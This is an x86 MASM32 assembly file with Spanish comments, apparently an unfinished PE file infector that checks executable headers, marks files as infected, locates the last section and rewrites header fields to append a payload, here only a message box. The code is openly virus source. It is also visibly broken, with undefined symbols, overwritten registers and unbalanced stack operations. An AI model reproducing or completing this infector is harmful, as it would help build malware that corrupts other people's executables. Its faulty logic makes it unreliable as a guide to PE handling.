ifndef INFECT_FILE_ASM_
INFECT_FILE_ASM_ MACRO
ENDM

.386
.model flat, stdcall
option casemap :none

include \masm32\include\msvcrt.inc
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc 
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.DATA

    ; Definiciones de datos necesarias para el proceso de infección
    lastsec_ptrtorawdata     dd 0
    lastsec_sizeofrawdata    dd 0
    lastsec_virtualaddress   dd 0
    lastsec_virtualsize      dd 0
    ptr_adressofentrypoint   dd 0
    ptr_numberofsections     dd 0
    ptr_sizeofcode           dd 0
    ptr_sizeofimage          dd 0
    ptr_sizeofheaders        dd 0
    imagebase                dd 0
    filealignment            dd 0
    oldentrypoint            dd 0
    pointertorawdata         dd 0
    ptr_sectionhdrtable      dd 0
    sectionalignment         dd 0
    tmpbuf                   dd 0
    msgText_2                db "Infection Process", 0
    msgCaption_2             db "Alert", 0
    msgCaption_db_1          db "Bytes Comparison", 0
    msgCaption_db_3          db "Image File Header", 0
    msgCaption_db_4          db "Number of Sections", 0
    msgError                 db "Common Error!", 0
    buffer_db_3              db 256 dup (0)
    buffer_db_4              db 256 dup (0)
    msgUpdate                db " Second header was updated!", 0
    msgEnd                   db "End of the infection!", 0

.DATA?
    filesearchhandle_if dd ?

.CODE
start_infect PROC
  ; Simular el proceso de infección

    pushad

     mov filesize_sf, eax
     invoke MessageBoxA, NULL, addr buffer_2, addr msgCaption, MB_OK
     invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
    ; Verificar la firma DOS
    invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK 
    cmp  WORD ptr [esi], "ZM"
    jne  infect_err

    ; Verificar si el archivo ya está infectado
    mov  ecx, 042h
    cmp  dword ptr [esi + 034h], ecx
    je   infect_err
    invoke MessageBoxA, NULL, addr msgCaption, addr msgCaption, MB_OK  
    mov  dword ptr [esi + 034h], ecx 

    ; Verificar la firma "PE\0\0"
    add  esi, dword ptr [esi + 03ch]
    cmp  WORD ptr [esi], "EP"
    jne infect_err
    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 

    ; Mover ESI al Optional Header
    push esi
    add  esi, 04h
    lea  ecx, dword ptr [esi + 02h]
    mov  esi, ecx
    pop  esi

    ; Modificar DataDirectory[11] (Export Table Bound Headers)
    xor  ecx, ecx
    mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx
    mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx
invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
    ; Verificar Magic Number
  ;  cmp WORD ptr [esi], 0B01h
  ;  jne infect_err

    ; Obtener varios campos del Optional Header
    lea  ecx, dword ptr [esi + 04h]
    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
    lea  eax, dword ptr [ptr_sizeofcode] ;314ch
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 010h]
    lea  eax, dword ptr [ptr_adressofentrypoint] ;0000
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 01ch]
    lea  eax, dword ptr [imagebase] ;c0h
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 020h]
    lea  eax, dword ptr [sectionalignment] ;0ah
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 024h]
    lea  eax, dword ptr [filealignment];700 0000
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 038h]
    lea  eax, dword ptr [ptr_sizeofimage];200
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 03ch]
    lea  eax, dword ptr [ptr_sizeofheaders];4
    mov  eax, ecx

    pop  esi

    add  esi, dword ptr [ptr_sizeofheaders]  ; esi -> IMAGE_SECTION_HEADER[0] "L"location

    lea  eax, dword ptr [ptr_sectionhdrtable] ;esi = c4h
    mov  eax, esi

    ; Obtener número de secciones
    mov  ecx, dword ptr [ptr_numberofsections]
    xor  eax, eax
    add  ax, cx

    ; Calcular la última sección
    mov  ecx, dword ptr [ptr_sizeofheaders]  ; SIZEOF IMAGE_SECTION_HEADER
    sub  eax, 1
    mul  ecx
    add  esi, eax  ; esi -> IMAGE_SECTION_HEADER[last]

    ; Obtener varios campos de la última sección
    mov  ecx, dword ptr [esi + 08h]
    lea  eax, dword ptr [lastsec_virtualsize];669fbeeh
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 0ch]
    lea  eax, dword ptr [lastsec_virtualaddress];00000000h
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 010h]
    lea  eax, dword ptr [lastsec_sizeofrawdata];00000000h
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 014h]
    lea  eax, dword ptr [lastsec_ptrtorawdata];10f00e0h
    mov  eax, ecx

    ; Calcular la dirección de la nueva sección
    mov  edx, dword ptr [lastsec_virtualaddress]
    add  edx, dword ptr [lastsec_virtualsize]
    
    invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
    push edx
    mov  edx, sectionalignment
    call ceil_align
    
    invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
   
    pop edx
    
    mov  dword ptr [lastsec_virtualaddress], eax
    
    ;invoke MessageBoxA, NULL, eax, addr msgCaption_db_1, MB_OK 
   
    ; Calcular el nuevo tamaño de la imagen
    lea  ecx, dword ptr [ptr_sizeofimage]
    mov  edx, dword ptr [ecx]
    add  edx, mycode_len
    push edx
    mov  edx, sectionalignment
    
    ;invoke MessageBoxA, NULL, addr sectionalignment, addr msgCaption_db_1, MB_OK 
    
    call ceil_align
     
    pop edx
    mov  dword ptr [ecx], eax

    ; Escribir el código en el archivo mapeado
    lea  esi, dword ptr [ptr_sectionhdrtable]
    
    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
    add  esi, dword ptr [ptr_numberofsections]
    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
    mov  ecx, dword ptr [lastsec_ptrtorawdata]
    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
    add  ecx, dword ptr [lastsec_sizeofrawdata]
    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
    

   ; mov  dword ptr [esi + 08h], mycode_len
    mov  dword ptr [esi + 0ch], ecx
    mov  eax, mycode_len
    mov  dword ptr [esi + 10h], eax

   ; invoke WriteFile, hfile, addr mycodestart, mycode_len, addr numwrite, 0

    invoke MessageBoxA, NULL, addr msgEnd, addr msgCaption, MB_OK
  
    jmp  fin
    
infect_err:
    invoke MessageBoxA, NULL, addr msgError , addr msgCaption, MB_OK 

fin:
       
    popad
    ret
start_infect ENDP

update_sec_hdrs2 PROC
    ; Guardar registros usados
    push esi
    push edi
    push ebx

    ; ebx contiene la base del archivo PE
    mov esi, ebx

    ; Verificar la firma DOS (MZ)
    cmp word ptr [esi], IMAGE_DOS_SIGNATURE
    jne not_pe_file

    ; Ir al e_lfanew en IMAGE_DOS_HEADER
    mov eax, [esi + 3Ch]
    add esi, eax

    ; Verificar la firma NT (PE)
    cmp dword ptr [esi], IMAGE_NT_SIGNATURE
    jne not_pe_file

    ; Ir al primer IMAGE_SECTION_HEADER
    add esi, 18h   ; Saltar IMAGE_FILE_HEADER
    mov ecx, [esi + 14h] ; Número de secciones
    add esi, 60h   ; Saltar IMAGE_OPTIONAL_HEADER

    ; Ahora esi apunta al primer IMAGE_SECTION_HEADER
    ; Inicializar edx como el índice
    xor edx, edx

next_section:
    ; Verificar si hemos procesado todas las secciones
    cmp edx, ecx
    jge all_sections_done

    ; Verificar la firma del código (0x42)
    cmp dword ptr [esi + 34h], 42h
    je infected_section_found

    ; Avanzar al siguiente IMAGE_SECTION_HEADER
    add esi, 28h
    inc edx
    jmp next_section

infected_section_found:
    ; La sección está infectada
    ; Realizar cualquier acción adicional aquí si es necesario

all_sections_done:
    jmp end_update_sec_hdrs2

not_pe_file:
    ; El archivo no es un archivo PE
    invoke MessageBoxA, NULL, addr msgError, addr msgCaption, MB_OK 

end_update_sec_hdrs2:
    ; Restaurar registros usados
    pop ebx
    pop edi
    pop esi
    ret
update_sec_hdrs2 ENDP

mycodestart:
    ; Aquí va tu código de payload
    ; Ejemplo: mensaje simple
    invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_2, MB_OK

    ; Este es el final del código del payload
    ; Puedes agregar más código según sea necesario


;mycode_len equ (end_copy - begin_copy)

endif 